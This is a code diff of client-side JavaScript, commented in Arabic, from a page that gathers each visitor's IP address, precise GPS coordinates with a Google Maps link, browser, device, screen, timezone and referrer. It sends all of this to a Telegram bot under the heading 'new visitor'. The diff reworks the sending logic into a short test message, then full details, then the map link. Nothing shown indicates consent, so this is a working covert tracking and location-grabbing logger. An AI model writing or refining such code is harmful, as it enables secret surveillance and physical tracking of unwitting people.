@@ -349,128 +349,111 @@
             log('📤 بدء الإرسال...');
             updateProgress(80);
             
-            let locationText = 'غير متاح';
-            let mapsLink = '';
-            
-            if (data.location) {
-                const { latitude, longitude, accuracy } = data.location;
-                locationText = `${latitude.toFixed(6)}, ${longitude.toFixed(6)} (دقة: ${accuracy}م)`;
-                mapsLink = `https://www.google.com/maps/dir//${latitude},${longitude}/@${latitude},${longitude},272m/data=!3m1!1e3`;
-            }
-            
-            const message = `🎯 زائر جديد:
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⏰ ${data.device.localTime}
-🌐 ${data.device.url}
-🔗 ${data.device.referrer}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📱 ${data.device.deviceType} | ${data.device.browser}
-📱 محمول: ${data.device.isMobile ? 'نعم' : 'لا'}
-🌍 IP: ${data.ip}
-📍 الموقع: ${locationText}
-${mapsLink ? `🗺️ الخريطة: ${mapsLink}` : ''}
-🗣️ ${data.device.language} | ${data.device.timezone}
-📱 ${data.device.screenRes} | ${data.device.platform}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-${data.device.userAgent}`;
+            // رسالة مبسطة جداً أولاً
+            const simpleMessage = `زائر جديد: ${new Date().toLocaleString('ar-SA')}`;
             
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const payload = {
-                chat_id: CHAT_ID,
-                text: message,
-                disable_web_page_preview: false
-            };
             
-            log('📡 رسالة جاهزة للإرسال');
-            log(`📡 URL: ${url}`);
-            
-            // إرسال رسالة اختبار أولاً
+            // محاولة إرسال رسالة بسيطة جداً
             try {
-                const testResponse = await fetch(url, {
+                log('📡 محاولة إرسال رسالة بسيطة...');
+                const simpleResponse = await fetch(url, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: '🔔 اتصال جديد...'
+                        text: simpleMessage
                     })
                 });
                 
-                if (testResponse.ok) {
-                    log('✅ الاتصال بالبوت ناجح');
-                } else {
-                    log('❌ فشل الاتصال بالبوت');
+                const simpleResult = await simpleResponse.text();
+                log(`📡 نتيجة الرسالة البسيطة: ${simpleResponse.status} - ${simpleResult}`);
+                
+                if (!simpleResponse.ok) {
+                    log('❌ فشلت الرسالة البسيطة - توقف');
+                    return false;
                 }
-            } catch (e) {
-                log('❌ خطأ في الاتصال: ' + e.message);
+            } catch (error) {
+                log(`❌ خطأ في الرسالة البسيطة: ${error.message}`);
+                return false;
             }
             
-            // إرسال البيانات الفعلية
-            for (let attempt = 1; attempt <= 3; attempt++) {
-                try {
-                    log(`📤 محاولة ${attempt}/3`);
+            // إذا نجحت الرسالة البسيطة، أرسل التفاصيل
+            let locationText = 'غير متاح';
+            let mapsLink = '';
+            
+            if (data.location) {
+                const { latitude, longitude, accuracy } = data.location;
+                locationText = `${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
+                mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            }
+            
+            // رسالة مفصلة بدون رموز خاصة
+            const detailedMessage = [
+                'معلومات الزائر:',
+                `الوقت: ${data.device.localTime}`,
+                `الرابط: ${data.device.url}`,
+                `المصدر: ${data.device.referrer}`,
+                `الجهاز: ${data.device.deviceType} - ${data.device.browser}`,
+                `محمول: ${data.device.isMobile ? 'نعم' : 'لا'}`,
+                `IP: ${data.ip}`,
+                `الموقع: ${locationText}`,
+                `اللغة: ${data.device.language}`,
+                `المنطقة الزمنية: ${data.device.timezone}`,
+                `الشاشة: ${data.device.screenRes}`,
+                `النظام: ${data.device.platform}`,
+                `المتصفح: ${data.device.userAgent}`
+            ].join('\n');
+            
+            // إرسال التفاصيل
+            try {
+                log('📡 إرسال التفاصيل...');
+                const detailResponse = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: detailedMessage
+                    })
+                });
+                
+                const detailResult = await detailResponse.text();
+                log(`📡 نتيجة التفاصيل: ${detailResponse.status} - ${detailResult.substring(0, 100)}`);
+                
+                if (detailResponse.ok) {
+                    log('✅ تم إرسال التفاصيل');
                     
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify(payload)
-                    });
-                    
-                    const responseText = await response.text();
-                    log(`📡 استجابة: ${response.status} - ${responseText.substring(0, 100)}`);
-                    
-                    if (response.ok) {
+                    // إرسال رابط الخريطة إن وجد
+                    if (mapsLink) {
                         try {
-                            const result = JSON.parse(responseText);
-                            if (result.ok) {
-                                log('✅ نجح الإرسال!');
-                                updateProgress(95);
-                                
-                                // إرسال رابط الخريطة منفصل
-                                if (mapsLink) {
-                                    try {
-                                        await fetch(url, {
-                                            method: 'POST',
-                                            headers: { 'Content-Type': 'application/json' },
-                                            body: JSON.stringify({
-                                                chat_id: CHAT_ID,
-                                                text: `🗺️ رابط مباشر:\n${mapsLink}`,
-                                                disable_web_page_preview: false
-                                            })
-                                        });
-                                        log('✅ رابط الخريطة أُرسل');
-                                    } catch (e) {
-                                        log('⚠️ فشل رابط الخريطة');
-                                    }
-                                }
-                                
-                                return true;
-                            } else {
-                                log(`❌ خطأ Telegram: ${result.description || 'غير معروف'}`);
-                            }
+                            await fetch(url, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    chat_id: CHAT_ID,
+                                    text: `خريطة الموقع: ${mapsLink}`
+                                })
+                            });
+                            log('✅ تم إرسال الخريطة');
                         } catch (e) {
-                            log(`❌ خطأ في تحليل الاستجابة: ${e.message}`);
+                            log('⚠️ فشل إرسال الخريطة');
                         }
-                    } else {
-                        log(`❌ HTTP ${response.status}: ${responseText}`);
                     }
                     
-                } catch (error) {
-                    log(`❌ خطأ ${attempt}: ${error.message}`);
+                    updateProgress(95);
+                    return true;
                 }
-                
-                // انتظار بين المحاولات
-                if (attempt < 3) {
-                    log('⏳ انتظار قبل المحاولة التالية...');
-                    await new Promise(resolve => setTimeout(resolve, 1500));
-                }
+            } catch (error) {
+                log(`❌ خطأ في إرسال التفاصيل: ${error.message}`);
             }
             
-            log('❌ فشل جميع المحاولات');
+            log('❌ فشل الإرسال النهائي');
             updateProgress(95);
             return false;
         }
